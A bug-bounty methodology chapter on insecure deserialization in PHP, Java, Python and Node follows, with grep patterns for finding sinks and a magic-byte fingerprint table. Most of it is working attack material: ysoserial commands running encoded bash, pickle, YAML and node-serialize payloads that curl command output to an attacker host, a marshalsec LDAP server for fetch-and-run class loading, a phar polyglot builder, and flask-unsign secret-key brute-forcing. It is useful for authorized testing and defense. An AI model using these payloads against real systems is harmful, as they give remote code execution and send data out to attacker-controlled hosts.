## 24. INSECURE DESERIALIZATION  🧬
> When an app rebuilds objects from attacker-controlled bytes, the deserializer can be steered into calling existing "gadget" methods that end in code execution. Almost always **RCE / Critical**. The hunt is: (1) find a sink that deserializes untrusted input, (2) confirm the wire format from its magic bytes, (3) reach for the language's known gadget chain.
>
> **.NET `__VIEWSTATE` deserialization is NOT here** — it lives in the Padding Oracle & Crypto Misuse class (ViewState → ysoserial.net gadget → RCE). This class covers PHP, Java, Python, and Node.

### Root Cause
```php
// PHP — VULNERABLE: user bytes hit unserialize()
$obj = unserialize($_COOKIE['prefs']);          // attacker controls the cookie

// SECURE: use a flat format with no object instantiation
$obj = json_decode($_COOKIE['prefs'], true);     // JSON builds no objects → no gadgets
```
The bug is never "deserialization" alone — it is deserialization of **untrusted** data into a language that auto-invokes magic methods (`__wakeup`, `readObject`, `__reduce__`) on reconstruction. Those methods are the trigger; gadget chains already present in the app's libraries do the rest.

### Detection
Grep the source (or decompiled JARs / JS bundles) for the sink, then confirm on the wire.

```bash
# PHP — unserialize on request data
grep -rniE "unserialize *\(" --include="*.php" | grep -iE "GET|POST|REQUEST|COOKIE|input|file_get_contents"
# PHP phar trigger — ANY file op on a user-controlled path can deserialize (pre-8.0 implicit, 8.0+ via getMetadata)
grep -rniE "file_(get_contents|exists)|fopen|is_(file|dir)|getimagesize|md5_file|copy|unlink|require|include" --include="*.php"

# Java — the readObject sink + the gadget-bearing libs
grep -rniE "readObject|readUnshared|ObjectInputStream|XMLDecoder|readValue.*enableDefaultTyping|@class" --include="*.java"
grep -rniE "commons-collections|commons-beanutils|groovy-all|spring-core|c3p0|rome" pom.xml build.gradle 2>/dev/null

# Python — pickle / yaml / jsonpickle
grep -rniE "pickle\.loads|cPickle|yaml\.load\(|jsonpickle\.decode|marshal\.loads|shelve\.open" --include="*.py" | grep -v "yaml.safe_load"

# Node — node-serialize / funcster / serialize-to-js
grep -rniE "node-serialize|\.unserialize\(|funcster|serialize-to-js" --include="*.js" --include="*.ts"
```

**Wire signatures — fingerprint the blob before you attack it.** Decode any opaque cookie / hidden field / param and look at the first bytes:

| Decoded prefix | Bytes | Format → gadget toolkit |
|---|---|---|
| `O:` / `a:` / `s:` | `4f 3a` / `61 3a` | PHP serialized object/array → build POP chain by hand |
| `rO0AB` (base64) | `ac ed 00 05` raw | Java serialized stream → **ysoserial** |
| `aced0005` (hex) | same | Java, hex-encoded → ysoserial |
| `gASV` / `gAJ` / `\x80\x04` / `\x80\x03` | `80 04` / `80 03` | Python pickle (protocol 4/3) → `__reduce__` |
| `{"...":"_$$ND_FUNC$$_..."}` | — | Node `node-serialize` → IIFE RCE |
| `PK\x03\x04` + `.phar` | `50 4b 03 04` | PHP Phar archive → phar:// trigger |
| `<java ...` / `<object class=` | — | Java `XMLDecoder` → direct method calls |

> **Key insight:** base64 starting with `rO0AB` is the single highest-signal string in bug bounty deserialization. It is `ac ed 00 05` (Java stream magic) base64-encoded — find it in a cookie, header, hidden field, or message body and you very likely have ysoserial-grade RCE.

### Bypass Techniques

**PHP — `__wakeup` property-count bypass (CVE-2016-7124, PHP < 5.6.25 / < 7.0.10).** If `__wakeup()` re-validates or resets your object, declare **more** properties in the serialized string than actually exist — PHP aborts the `__wakeup` call and your `__destruct`/`__toString` gadget still fires.
```php
O:4:"User":2:{s:4:"file";s:8:"/etc/pwd";...}   // normal — __wakeup runs
O:4:"User":3:{s:4:"file";s:8:"/etc/pwd";...}   // count 3 > real 2 → __wakeup SKIPPED, gadget survives
```

**PHP — POP chain (Property-Oriented Programming).** Chain magic methods across classes the app already loads: a controlled `__destruct()` or `__toString()` calls a method on a property you control, which calls another, ending in `system()` / `file_get_contents()` / `call_user_func()`.
```php
// Gadget: a class whose __toString reads a file you name
class FileViewer { public $filename;
    function __toString(){ return file_get_contents($this->filename); } }
// Payload reaches __toString by placing this object where the app echoes/concats it
O:10:"FileViewer":1:{s:8:"filename";s:11:"/etc/passwd";}
// Framework chains exist out of the box — Laravel, Symfony, Monolog, Guzzle (see phpggc)
```

**PHP — `phar://` trigger when there is no direct `unserialize()`.** Any file operation on a path you control deserializes a Phar's metadata. Upload a polyglot (valid JPEG **and** valid Phar — `phar` magic in the stub) through an image upload, then point a file-op param at `phar://uploads/evil.jpg`.
```php
// Build the phar locally (php.ini phar.readonly=Off)
$p = new Phar('evil.phar'); $p->startBuffering();
$p->setStub('GIF89a<?php __HALT_COMPILER();');           // image polyglot stub
$o = new Monolog\Handler\SyslogUdpHandler(...);           // a real POP gadget object
$p->setMetadata($o);                                      // <-- this gets unserialized on access
$p->addFromString('x','x'); $p->stopBuffering();
// Trigger: file_exists("phar://./uploads/evil.jpg") / getimagesize(...) / is_dir(...)
```
> PHP 8.0 stopped auto-unserializing Phar metadata on stream-wrapper ops — only explicit `Phar::getMetadata()` does it now. Still live on the huge installed base of PHP 7.x and on code paths that call `getMetadata()`.

**Java — ysoserial gadget generation.** Pick the chain by which vulnerable library is on the classpath (confirm via `/META-INF/MANIFEST.MF`, jar names, or a stack trace — see Error Disclosure class). CommonsCollections5/6 are the workhorses (Apache Commons Collections 3.1–3.2.1, CVE-2015-7501, CVSS 9.8).
```bash
# Encoded command (avoid shell-quoting hell) — CC6 works under JDK 8u71+ where CC5 breaks
java -jar ysoserial.jar CommonsCollections6 'bash -c {echo,BASE64CMD}|{base64,-d}|bash' > p.bin
java -jar ysoserial.jar CommonsCollections5 'curl http://attacker/$(whoami)' > p.bin   # blind/OOB confirm
base64 -w0 p.bin    # paste into a cookie / header / hidden field that decodes to a Java stream
```
**Java — JNDI gadget (when no CC on classpath but Jackson/JNDI lookup reachable).** Stand up a malicious LDAP/RMI server (`marshalsec`) and point the gadget at it; the server fetches and runs your remote class.
```bash
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker:8000/#Exploit" 1389
# gadget JNDI URL → ldap://attacker:1389/Exploit   (Log4Shell-style fetch-and-run)
```
**Java — no native object stream?** Look for `XMLDecoder` (deserializes `<java><object class="...">` XML straight to method calls) and Jackson/`enableDefaultTyping` + `@class` polymorphic JSON, both of which give the same RCE without `ac ed 00 05` on the wire.

**Python — pickle `__reduce__` RCE.** `__reduce__` returns `(callable, args)` that the unpickler executes. One object = one command.
```python
import pickle, os
class Evil:
    def __reduce__(self):
        return (os.system, ('curl http://attacker/$(id|base64)',))   # OOB-confirm blind RCE
payload = pickle.dumps(Evil())     # send raw, or base64 it into the cookie/param
```
**Python — signed-cookie HMAC forgery (Flask / Django).** Flask sessions are signed, not encrypted — if you recover/guess `SECRET_KEY` (debug page, `/actuator`-style leak, GitHub, weak default), you re-sign a malicious payload. A Flask **filesystem** session whose cookie base64 starts with `gASV` is already pickle — forge a session file with a `__reduce__` object and RCE. Django's `PickleSerializer` signed-cookie sessions are the same primitive.
```bash
# Flask itsdangerous resign with a recovered key
flask-unsign --sign --cookie "{...}" --secret 'LEAKED_KEY'
# Brute the key against a captured cookie if it's weak/default
flask-unsign --unsign --cookie "<captured>" --wordlist /path/secrets.txt --no-literal-eval
```
**Python — `yaml.load` without a safe loader.** `yaml.load(data)` (no `Loader=SafeLoader`) instantiates arbitrary Python via `!!python/object/apply`.
```yaml
!!python/object/apply:os.system ["curl http://attacker/$(id)"]
```

**Node — `node-serialize` IIFE (CVE-2017-5941).** `unserialize()` will `eval` any property value prefixed `_$$ND_FUNC$$_`; append `()` to make it self-invoke on deserialize.
```js
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('curl http://attacker/$(id|base64)')}()"}
// base64 the JSON if the input is decoded first; the trailing () = immediate invocation
```

### Testing Checklist
```
[ ] Decode every opaque cookie / hidden field / token / message body → check first bytes vs the wire-signature table
[ ] rO0AB / ac ed 00 05 anywhere → Java stream → fingerprint libs (MANIFEST.MF, jar names, stack trace) → ysoserial
[ ] O:/a:/s: in a param → PHP — try __wakeup count bump, then a phpggc framework POP chain
[ ] gASV / \x80\x04 → Python pickle → __reduce__ object; if Flask/Django session, hunt SECRET_KEY first
[ ] node-serialize in a JS bundle → send _$$ND_FUNC$$_ IIFE
[ ] No direct sink? PHP file-op param → upload image-polyglot phar → phar:// trigger
[ ] Confirm BLIND RCE out-of-band (curl/nslookup to your Collaborator/interactsh) — never trust a 500 alone
[ ] Use phpggc (PHP) / ysoserial (Java) — do NOT hand-roll a chain you can generate
```

### Real Paid Examples
- **CVE-2015-7501 (Apache Commons Collections, CVSS 9.8)** — `ac ed 00 05` Java stream + CommonsCollections gadget = unauthenticated RCE; the canonical pattern behind hundreds of enterprise-app deserialization bounties.
- **CVE-2017-5941 (node-serialize)** — `unserialize()` of a `_$$ND_FUNC$$_` IIFE = RCE; pattern recurs wherever an app feeds request JSON straight into `node-serialize.unserialize`.
- Arbitrary file delete via phar:// deserialization — disclosed on HackerOne (report 921288); phar metadata POP chain reaching a file-op gadget.
- PHP framework POP chains (Laravel, Symfony, Monolog, Guzzle) — gadget chains shipped in phpggc are repeatedly used in bug-bounty unserialize findings; RCE Critical when a sink reaches request data.
- Pattern seen on HackerOne/Bugcrowd: Flask filesystem session cookies prefixed `gASV` (pickle) + leaked `SECRET_KEY` from a debug surface → forged session → RCE.

### Chain Escalation
```
rO0AB Java stream + vulnerable lib (CC/Spring/Groovy) -> ysoserial gadget          RCE / Critical
PHP unserialize(request) + phpggc framework POP chain -> system()                  RCE / Critical
phar:// via image-polyglot upload + file-op sink -> metadata POP chain             RCE / Critical (or file delete/read)
Python pickle.loads(request) -> __reduce__ -> os.system                            RCE / Critical
Flask/Django signed session + leaked SECRET_KEY -> forged pickle session           RCE / Critical (chain from secret leak)
node-serialize unserialize(request) -> _$$ND_FUNC$$_ IIFE                          RCE / Critical
XMLDecoder / Jackson @class polymorphic JSON (no ac ed magic) -> method-call RCE   RCE / Critical
__wakeup-bypassed PHP object reaching __toString file read (no command exec)       High (LFI / SSRF, info disclosure)
Deserialization sink confirmed but NO gadget on classpath / blind w/ no OOB proof  N/A — not submittable until you land code exec or OOB callback
```
> Deserialization is one of the few classes where a single request is plausibly Critical — but **only with a working PoC**. A `rO0AB` blob or an `unserialize()` grep hit with no demonstrated gadget execution is N/A. Land OOB (Collaborator/interactsh callback) or command output, or kill it. Where the encrypted blob also leaks a padding oracle, see the Padding Oracle & Crypto Misuse class for the ViewState/forge-the-blob path.

